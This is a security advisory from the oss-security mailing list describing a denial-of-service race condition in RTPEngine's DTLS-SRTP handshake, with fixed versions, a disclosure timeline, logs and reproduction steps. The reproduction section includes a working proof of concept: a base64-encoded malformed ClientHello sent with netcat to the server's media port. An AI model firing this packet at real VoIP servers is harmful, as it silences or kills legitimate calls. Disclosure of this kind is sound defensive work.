Received: (qmail 13499 invoked by uid 550); 15 Dec 2023 16:42:58 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17542 invoked from network); 15 Dec 2023 14:50:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=cc:content-transfer-encoding:content-type
	:content-type:date:date:from:from:in-reply-to:message-id
	:mime-version:reply-to:subject:subject:to:to; s=fm3; t=
	1702651867; x=1702738267; bh=N0eoTuRYEN7Mrf/0JDywhnDbqmM2EK5x0gi
	R3tC6lqk=; b=J3u5grS6Umj2yjZ8V6sg5FbZ+RUoDyNrHRLUQkXeDiZcmJtpcrE
	N6QvMmtZEUoawcKFJkHQ3XSSMaITzqQ/QnjbUGRCQ6Dqn8ga9F8aC6e336R4AY9X
	bR8mVzaTjfyhNDonu8UF+rP3EFzHHStJ7vM75gB5aJYWwgdwpxTdeZCdhJbBhpCE
	KFsbAzMjYOdqXmnuwKKgilRotg1/74+yPWfjdP7WZ2/GrkwYMT//GJ/IBhcc4qXO
	8zFW+JTv5Nnjx60eBy+hm18tcgrOnA68aqsQLSSxAZNc4oECWpcVNaxBfyHfUHUP
	ivxKzvRjUYFwza0BxFhEB2241W/z3vln9DQ==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:content-transfer-encoding:content-type
	:content-type:date:date:feedback-id:feedback-id:from:from
	:in-reply-to:message-id:mime-version:reply-to:subject:subject:to
	:to:x-me-proxy:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=
	fm2; t=1702651867; x=1702738267; bh=N0eoTuRYEN7Mrf/0JDywhnDbqmM2
	EK5x0giR3tC6lqk=; b=sghojhTyq/xxBMTz4gstk5x5sRwb0lYvTV/Clb+eXLop
	oSXHO+sT8TfWv/uUKz7Ue5WQuh+Spe7cWWe/J2IyFnBFY7iFZ/NP9/TsDGuP72En
	GEPlcJB3K7uYC3B8E+dSD2YsIGAw/ZafedWSGAa1IxAzlI1NggWae/MzjpafukW2
	mpDLj5JAIYkmR87HZdaCAksmeKKQxsHBax6TxQK30tyNKrDuZPuZ+NqPHpMtbg04
	u06cUHaNY4dlib8OSbl/mHX5TSwapgrqF6wbsiD1tIATK/OiuWI+uNvxUk7JRk0l
	gqcoOf89DigJhu7v4TsxxjyVLV330ZhT6zG/1VlXww==
X-ME-Sender: <xms:2md8Zel9dvOxBpx0XheoJhG5nQGOli6PRtHEraemIaOVzwz2X7785Q>
    <xme:2md8ZV0OVYf5I5X5SmCnPLBOdFqSu7qVtTQRBv-VWzVqxk69ZLWcGoxzJjupaoArj
    RQMdRMBw4xZ1SNi-w>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvkedrvddtvddgieelucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtgfesthhqre
    dtreerjeenucfhrhhomhepfdfurghnughrohcuifgruhgtihdfuceoshgrnhgurhhosegv
    nhgrsghlvghsvggtuhhrihhthidrtghomheqnecuggftrfgrthhtvghrnhepgfetheffge
    efkefgheduffdujeeviefgfedugeffheekudetffeftdetgfejtdfgnecuffhomhgrihhn
    pehgihhthhhusgdrtghomhdpvghnrggslhgvshgvtghurhhithihrdgtohhmpdhivghtfh
    drohhrghdprhhttghsvggtrdgtohhmnecuvehluhhsthgvrhfuihiivgeptdenucfrrghr
    rghmpehmrghilhhfrhhomhepshgrnhgurhhosegvnhgrsghlvghsvggtuhhrihhthidrtg
    homh
X-ME-Proxy: <xmx:2md8ZcoDO-VpX3Ix5fqJsuAkeQ3cN8vjuOIEefw756To4dz9n4Tdwg>
    <xmx:2md8ZSmFo45f3ZLZNf0KFNwdBUH-Tq_n7rxbhzI2M05BvyEgqXvXbA>
    <xmx:2md8Zc1MUjG1m7MLyyKQyVMPUSgH2tFu_idhzeQM40pycM1tO_pTwA>
    <xmx:22d8ZZzbr3Vm89V2cNsh5ZcAEfXZzRZeCgFR02iGhwK4wY5z-Nwq4Q>
Feedback-ID: if8634316:Fastmail
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.9.0-alpha0-1283-g327e3ec917-fm-20231207.002-g327e3ec9
MIME-Version: 1.0
Message-Id: <e5d97eb0-4bd5-41bd-95a6-67305ec4d3db@app.fastmail.com>
Date: Fri, 15 Dec 2023 15:48:22 +0100
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com,
 "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>,
 voipsec@voipsa.org, submissions@packetstormsecurity.org, vuln@secunia.com,
 cert@cert.org
Content-Type: text/plain;charset=utf-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] [ES2023-03] RTPEngine susceptible to Denial of Service via DTLS Hello packets
 during call initiation

# RTPEngine susceptible to Denial of Service via DTLS Hello packets during =
call initiation

- Fixed versions: mr12.1.1.2, mr12.0.1.3, mr11.5.1.16, mr10.5.6.3, mr10.5.6=
.2
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tr=
ee/master/ES2023-03-rtpengine-dtls-hello-race
- Vendor Patch: https://github.com/sipwise/rtpengine/commit/e969a79428ac4a1=
5cdf1c0a1c6f266dbdc7e60b6
- Tested vulnerable versions: mr11.5.1.6
- Timeline:
	- Report date: 2023-10-02
	- Triaged: 2023-10-02
	- Fix provided for testing: 2023-11-16
	- Enable Security verified fix: 2023-12-14
	- Vendor release with fix: 2023-12-14
	- Enable Security advisory: 2023-12-15

## TL;DR

When handling DTLS-SRTP for media setup, RTPEngine is susceptible to Denial=
 of Service due to a race condition in the hello handshake phase of the DTL=
S protocol. This attack can be done continuously, thus denying new DTLS enc=
rypted calls during the attack.

## Description

Our research has shown that key establishment for Secure Real-time Transpor=
t Protocol (SRTP) using Datagram Transport Layer Security Extension (DTLS)[=
^1] is susceptible to a Denial of Service attack due to a race condition. I=
f an attacker manages to send a ClientHello DTLS message with an invalid Ci=
pherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to the port on the RTPEngine =
server that is expecting packets from the caller, the media session is torn=
 down.

This behavior was tested against RTPEngine version mr11.5.1.6, which was fo=
und to be vulnerable to this issue.

The following sequence diagram shows the normal flow (i.e. no attack) invol=
ving SIP, STUN and DTLS messages between a UAC (the Caller), Kamailio and a=
n RTPEngine server capable of handling WebRTC calls.

Diagram showing a call setup against RTPEngine that uses SIP, STUN and DTLS:
https://github.com/EnableSecurity/advisories/raw/master/ES2023-03-rtpengine=
-dtls-hello-race/resources/valid.png

In a controlled experiment, it was observed that when the Attacker sent a D=
TLS ClientHello to RTPEngine's media port from a different IP and port, RTP=
Engine gave an internal error and did not process the call any longer.

Diagram showing a call setup against RTPEngine that fails due to an attacke=
r controlled DTLS ClientHello:
https://github.com/EnableSecurity/advisories/raw/master/ES2023-03-rtpengine=
-dtls-hello-race/resources/dos.png

During a real attack, the attacker would spray a vulnerable RTPEngine serve=
r with DTLS ClientHello messages. The attacker would typically target the r=
ange of UDP ports allocated for RTP. When the ClientHello message from the =
Attacker wins the race against an expected ClientHello from the Caller, RTP=
Engine terminates the media session resulting in Denial of Service.

The following log shows that RTPEngine resets the DTLS connection context:

```
DEBUG: [... port 39910]: [ice] Received ICE/STUN response code 0 for candid=
ate pair TUk2hmDhRdEwbjA1:6249488300:1 from 192.168.1.202:56083 to 192.168.=
1.202
DEBUG: [... port 39910]: [ice] Setting ICE candidate pair TUk2hmDhRdEwbjA1:=
6249488300:1 as succeeded
DEBUG: [... port 39910]: [ice] Best succeeded ICE pair with all components =
is TUk2hmDhRdEwbjA1:6249488300:1
DEBUG: [... port 39910]: [ice] ICE not completed yet, but can use pair TUk2=
hmDhRdEwbjA1:6249488300:1
INFO: [... port 39910]: [ice] ICE negotiated: peer for component 1 is 192.1=
68.1.202:56083
INFO: [... port 39910]: [ice] ICE negotiated: local interface 192.168.1.202
DEBUG: [... port 39910]: [srtp] Processing incoming DTLS packet
ERR: [... port 39910]: [crypto] DTLS error: 1 (no shared cipher)
ERR: [... port 39910]: [srtp] DTLS error on local port 39910
DEBUG: [... port 39910]: [crypto] Resetting DTLS connection context
```

## Impact

Abuse of this vulnerability may lead to a massive Denial of Service on vuln=
erable RTPEngine servers for calls that rely on DTLS-SRTP. In practice, thi=
s results in all new calls appearing to be on mute.

## How to reproduce the issue

1. Run an RTPEngine instance with the following command:

    ```bash
	rtpengine -f \
		--interface=3D<interface> \
		--listen-ng=3D"<listen-ng>" \
		--pidfile=3D<pidfile> \
		--port-min=3D35000 \
		--port-max=3D40000 \
		--log-stderr \
		--log-level=3D10
	```
1. Run a Kamailio instance with the following configuration:

	```bash
	debug=3D2
	log_stderror=3Dyes

	memdbg=3D5
	memlog=3D5

	log_facility=3DLOG_LOCAL0

	loadmodule "pv.so"
	loadmodule "xlog.so"
	loadmodule "rtpengine.so"
	loadmodule "sl.so"
	loadmodule "tm.so"
	loadmodule "textops.so"
	loadmodule "siputils.so"

	modparam("rtpengine", "rtpengine_sock", "udp:<listen-ng>")

	alias=3D"<alias>"

	request_route {
		xlog("L_INFO","$su\n");

		if ($rm =3D=3D "INVITE") {
			$avp(caller_source)=3D"$si:$sp";
		}

		if ($avp(caller_source) =3D=3D "$si:$sp") {
			if ($rm =3D=3D "INVITE") {
				rewritehostport("192.168.1.202:9999");
				rtpengine_manage("replace-origin replace-session-connection pad-crypto =
RTP/SAVPF ICE=3Dforce");

				t_relay();
			}
			break;
		} else {
			xlog("L_INFO","got a request from callee [$rm]\n");
			break;
		}
	}

	onreply_route{
		if ($avp(caller_source) !=3D "$si:$sp") {
			if (!is_request()) {
				xlog("L_INFO","got a reply from callee [$rs $rr]\n");
				if has_body("application/sdp") {
					rtpengine_manage("replace-origin replace-session-connection pad-crypto=
 RTP/SAVPF ICE=3Dforce");
				}
			}
			exit;
		}
	}
   ```

1. Send an INVITE message to Kamailio with WebRTC SDP:

    ```default
	INVITE sip:1000@192.168.1.202 SIP/2.0
	Via: SIP/2.0/WSS 192.168.1.202:36742;rport=3D36742;branch=3Dz9hG4bK-jQcnXJ=
adB2VGfGmQ
	Max-Forwards: 70
	From: <sip:1000@192.168.1.202>;tag=3DL9kc5NfpYG1u67cT
	To: <sip:1000@192.168.1.202>
	Contact: <sip:1000@192.168.1.202>
	Call-ID: DzGnBLt0z9SK3MC0
	CSeq: 5 INVITE
	Content-Type: application/sdp
	Content-Length: 385

	v=3D0
	o=3D- 1695296331 1695296331 IN IP4 192.168.1.202
	s=3D-
	t=3D0 0
	c=3DIN IP4 192.168.1.202
	m=3Daudio 45825 UDP/TLS/RTP/SAVPF 0 8 101
	a=3Dsetup:active
	a=3Dfingerprint:sha-256 49:05:98:B2:15:43:1C:9C:4F:29:07:60:F8:63:77:16:80=
:F9:44:C0:97:8E:E5:48:D6:71:B4:03:10:85:D6:E3
	a=3Drtpmap:0 PCMU/8000/1
	a=3Drtpmap:8 PCMA/8000/1
	a=3Drtpmap:101 telephone-event/8000
	a=3Drtcp-mux
	a=3Drtcprsize
	a=3Dsendrecv
	```
1. Note RTPEngine's media port and IP values, which will be used as the `<r=
tpengine-ip>` and `<media-port>` parameters by the Attacker
1. Send a DTLS ClientHello message from a (attacker-controlled) host, which=
 is different from the Caller but has network access to the RTPEngine server

    ```bash
	CLIENT_HELLO=3D"Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA"=20
	CLIENT_HELLO=3D"${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
	CLIENT_HELLO=3D"${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
	CLIENT_HELLO=3D"${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
	CLIENT_HELLO=3D"${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA=3D"
	echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <rtpengine-ip> <media-=
port>
	```
1. Observe that RTPEngine reports that the DTLS context has been reset

## Solution and recommendations

To address this vulnerability, upgrade RTPEngine to the latest version whic=
h includes the security fix. The solution implemented is to drop all packet=
s from addresses that have not been validated by an ICE check.


## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive securi=
ty tools and provides quality penetration testing to help protect your real=
-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of p=
ublishing based on currently available information. Use of the information =
constitutes acceptance for use in an AS IS condition. There are no warranti=
es with regard to this information. Neither the author nor the publisher ac=
cepts any liability for any direct, indirect, or consequential loss or dama=
ge arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy=
 which can be found at <https://github.com/EnableSecurity/Vulnerability-Dis=
closure-Policy>.

[^1]: Datagram Transport Layer Security (DTLS) Extension to Establish Keys =
for the Secure Real-time Transport Protocol (SRTP) https://datatracker.ietf=
.org/doc/html/rfc5764

--
=20
    Sandro Gauci, CEO at Enable Security GmbH

    Register of Companies:       AG Charlottenburg HRB 173016 B
    Company HQ:                       Neuburger Stra=C3=9Fe 101 b, 94036 Pa=
ssau, Germany
    RTCSec Newsletter:               https://www.rtcsec.com/subscribe
    Our blog:                                https://www.rtcsec.com
    Other points of contact:       https://www.enablesecurity.com/contact/
